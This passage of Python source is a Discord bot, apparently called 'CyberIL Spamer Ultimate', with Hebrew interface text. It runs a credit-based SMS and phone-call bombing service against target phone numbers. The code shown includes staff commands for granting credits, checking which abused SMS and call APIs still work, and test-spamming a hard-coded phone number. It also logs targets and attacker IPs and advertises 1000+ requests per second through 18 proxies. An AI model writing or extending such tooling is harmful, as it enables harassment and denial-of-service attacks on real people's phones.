            await interaction.followup.send(embed=discord.Embed(title="📊 סטטיסטיקה", description="אין נתונים", color=COLOR_INFO), ephemeral=True)
            return
        embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
        embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
        embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
        embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all_global")
    async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_owner(interaction):
            await interaction.response.send_message("❌ רק הבעלים יכול לעצור את כל המתקפות", ephemeral=True)
            return
        
        stop_all_event.set()
        stopped_count = 0
        for user_id, event in list(active_missions.items()):
            if event and not event.is_set():
                event.set()
                stopped_count += 1
        active_missions.clear()
        
        embed = discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        await asyncio.sleep(2)
        stop_all_event.clear()

class FreeCoins(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל קרדיט חינם", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        await interaction.response.defer(ephemeral=True)
        doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
        if doc:
            diff = now - doc.get("last_claim", 0)
            if diff < 86400:
                hours = int((86400 - diff) // 3600)
                minutes = int(((86400 - diff) % 3600) // 60)
                await interaction.followup.send(embed=discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING), ephemeral=True)
                return
        await add_credits(uid, 1)
        await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
        new_bal = await format_balance(uid)
        await interaction.followup.send(embed=discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\nיתרה: {new_bal}", color=0xFFD700), ephemeral=True)

# ============ STATS FUNCTIONS ============
async def get_user_stats(user_id: int):
    pipeline = [{"$match": {"user_id": user_id}}, {"$group": {"_id": "$user_id", "total_attacks": {"$sum": 1}, "total_cost": {"$sum": "$cost"}, "total_success": {"$sum": "$success_count"}}}]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_stats():
    pipeline = [{"$group": {"_id": None, "total_attacks": {"$sum": 1}, "total_cost": {"$sum": "$cost"}, "total_success": {"$sum": "$success_count"}, "unique_users": {"$addToSet": "$user_id"}}}]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_user_logs(user_id: int, limit: int = 20):
    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_logs(limit: int = 100):
    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_top_targets(limit: int = 10):
    pipeline = [{"$group": {"_id": "$phone", "count": {"$sum": 1}, "success_total": {"$sum": "$success_count"}}}, {"$sort": {"count": -1}}, {"$limit": limit}]
    return await logs_collection.aggregate(pipeline).to_list(length=limit)

# ============ EVENTS ============
@client.event
async def on_ready():
    await tree.sync()
    client.add_view(MainPanel())
    client.add_view(FreeCoins())
    await client.change_presence(activity=discord.Game(name="💀 1000+ בקשות/שנייה | 18 פרוקסי 💀"))
    print(f"✅ CyberIL Spamer Ultimate פעיל → {client.user}")
    print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🔥 18 פרוקסי ישראליים טעונים")
    now = time.time()
    expired = await lifetime_collection.find({"expires_at": {"$lt": now, "$gt": 0}}).to_list(length=None)
    for item in expired:
        await lifetime_collection.delete_one({"_id": item["_id"]})
    await asyncio.sleep(2)
    try:
        main_ch = client.get_channel(PANEL_CHANNEL)
        if main_ch:
            await main_ch.purge(limit=5)
            await main_ch.send(embed=create_panel(), view=MainPanel())
            print(f"✅ פאנל נשלח ל-{main_ch.name}")
        gift_ch = client.get_channel(GIFT_CHANNEL)
        if gift_ch:
            await gift_ch.purge(limit=5)
            await gift_ch.send(embed=create_gift_panel(), view=FreeCoins())
            print(f"✅ הודעת קרדיטים נשלחה ל-{gift_ch.name}")
    except Exception as e:
        print(f"❌ שגיאה: {e}")

@client.event
async def on_disconnect():
    global is_shutting_down
    is_shutting_down = True
    for user_id, event in active_missions.items():
        if event and not event.is_set():
            event.set()
    active_missions.clear()

async def shutdown_handler():
    global is_shutting_down
    is_shutting_down = True
    for user_id, event in active_missions.items():
        if event and not event.is_set():
            event.set()
    active_missions.clear()
    await client.close()

# ============ ADMIN COMMANDS ==========
@tree.command(name="addcredit", description="[STAFF] הוסף קרדיטים")
async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await add_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_SUCCESS)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[STAFF] הסר קרדיטים")
async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await remove_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_WARNING)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[STAFF] הענק ללא הגבלה")
async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int = None, unit: str = "forever"):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    if unit.lower() == "forever" or duration is None:
        await set_lifetime(member.id)
        await interaction.followup.send(embed=discord.Embed(title="♾️ Lifetime הוענק", description=f"{member.mention} קיבל lifetime לתמיד", color=COLOR_SUCCESS))
        return
    unit_map = {"minutes": 60, "hours": 3600, "days": 86400, "months": 2592000}
    if unit.lower() in unit_map:
        seconds = duration * unit_map[unit.lower()]
        await set_lifetime(member.id, seconds)
        await interaction.followup.send(embed=discord.Embed(title="♾️ Lifetime הוענק", description=f"{member.mention} קיבל lifetime ל-{duration} {unit}", color=COLOR_SUCCESS))
    else:
        await interaction.followup.send("❌ יחידה לא תקינה", ephemeral=True)

@tree.command(name="removelifetime", description="[STAFF] הסר ללא הגבלה")
async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await remove_lifetime(member.id)
    await interaction.response.send_message(embed=discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING))

@tree.command(name="checkapi", description="[STAFF] בדוק אילו APIs עובדים")
async def cmd_checkapi(interaction: discord.Interaction):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    embed = discord.Embed(title="🔍 בדיקת APIs", color=COLOR_INFO)
    embed.add_field(name="🔄", value="בודק את כל ה-APIs... זה ייקח כמה שניות", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)
    
    results = await check_all_apis()
    
    working = [r for r in results if r["status"]]
    failed = [r for r in results if not r["status"]]
    
    embed = discord.Embed(title="📊 תוצאות בדיקת APIs", color=COLOR_SUCCESS if working else COLOR_DANGER)
    embed.add_field(name="✅ עובדים", value=f"{len(working)}/{len(results)}", inline=True)
    embed.add_field(name="❌ נכשלו", value=f"{len(failed)}/{len(results)}", inline=True)
    
    if working:
        working_list = "\n".join([f"✅ {r['name']}" for r in working[:15]])
        embed.add_field(name="📡 APIs שעובדים", value=working_list if working_list else "אין", inline=False)
    
    if failed:
        failed_list = "\n".join([f"❌ {r['name']}" for r in failed[:15]])
        embed.add_field(name="⚠️ APIs שנכשלו", value=failed_list if failed_list else "אין", inline=False)
    
    await interaction.edit_original_response(embed=embed)

@tree.command(name="stopall", description="[OWNER] עצור את כל המתקפות")
async def cmd_stopall(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    
    stop_all_event.set()
    stopped_count = 0
    for user_id, event in list(active_missions.items()):
        if event and not event.is_set():
            event.set()
            stopped_count += 1
    active_missions.clear()
    
    embed = discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS)
    await interaction.response.send_message(embed=embed, ephemeral=True)
    
    await asyncio.sleep(2)
    stop_all_event.clear()

@tree.command(name="restart", description="[OWNER] אתחל בוט")
async def cmd_restart(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
    await shutdown_handler()
    os.execv(sys.executable, [sys.executable] + sys.argv)

@tree.command(name="checkstatus", description="[STAFF] בדוק סטטוס")
async def cmd_checkstatus(interaction: discord.Interaction):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    success = await run_spam_batch("0506500708")
    embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
    embed.add_field(name="✅ בקשות", value=str(success), inline=True)
    embed.add_field(name="🔥 פרוקסי", value="18", inline=True)
    embed.add_field(name="📞 סוג", value="SMS + CALL (50+ שירותים)", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="attacklogs", description="[STAFF] לוגים")
async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    logs = await get_all_logs(min(limit, 50))
    if not logs:
        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
        return
    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
    for log in logs[:10]:
        embed.add_field(name=f"{log['username']} | {log.get('date', '')} {log.get('time', '')}", value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}\n🌐 {log.get('ip', 'unknown')}", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="globalstats", description="[STAFF] סטטיסטיקה גלובלית")
async def cmd_globalstats(interaction: discord.Interaction):
    if not is_staff(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    stats = await get_global_stats()
    if not stats:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return
    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
    embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="freecredits", description="קבל קרדיט חינם (פעם ב-24 שעות)")
async def cmd_freecredits(interaction: discord.Interaction):
    uid = interaction.user.id
    now = time.time()
    await interaction.response.defer(ephemeral=True)
    doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
    if doc:
        diff = now - doc.get("last_claim", 0)
        if diff < 86400:
            hours = int((86400 - diff) // 3600)
            minutes = int(((86400 - diff) % 3600) // 60)
            await interaction.followup.send(embed=discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING), ephemeral=True)
            return
    await add_credits(uid, 1)
    await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
    new_bal = await format_balance(uid)
    await interaction.followup.send(embed=discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\nיתרה: {new_bal}", color=0xFFD700), ephemeral=True)

@tree.command(name="credits", description="בדוק יתרת קרדיטים")
async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    bal = await format_balance(target.id)
    stats = await get_user_stats(target.id)
    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_INFO)
    if stats:
        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="transfer", description="העבר קרדיטים")
async def cmd_transfer(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה 20", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך", ephemeral=True)
        return
    uid = interaction.user.id
    if await has_unlimited(uid):
        await interaction.followup.send("❌ משתמשי lifetime לא יכולים להעביר", ephemeral=True)
        return
    bal = await fetch_balance(uid)
    if bal < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים", ephemeral=True)
        return
    await remove_credits(uid, amount)
    await add_credits(member.id, amount)
    await interaction.followup.send(embed=discord.Embed(title="💸 העברה הושלמה", color=COLOR_SUCCESS).add_field(name="מאת", value=interaction.user.mention).add_field(name="אל", value=member.mention).add_field(name="כמות", value=str(amount)), ephemeral=True)

@tree.command(name="mylogs", description="הצג לוגים")
async def cmd_mylogs(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_logs(interaction.user.id, 10)
    if not logs:
        await interaction.followup.send("📭 אין מתקפות", ephemeral=True)
        return
    embed = discord.Embed(title="📋 לוגים", color=COLOR_INFO)
    for log in logs:
        embed.add_field(name=f"{log.get('date', '')} {log.get('time', '')}", value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)

if __name__ == "__main__":
    try:
        client.run(TOKEN)
    except KeyboardInterrupt:
        asyncio.run(shutdown_handler())
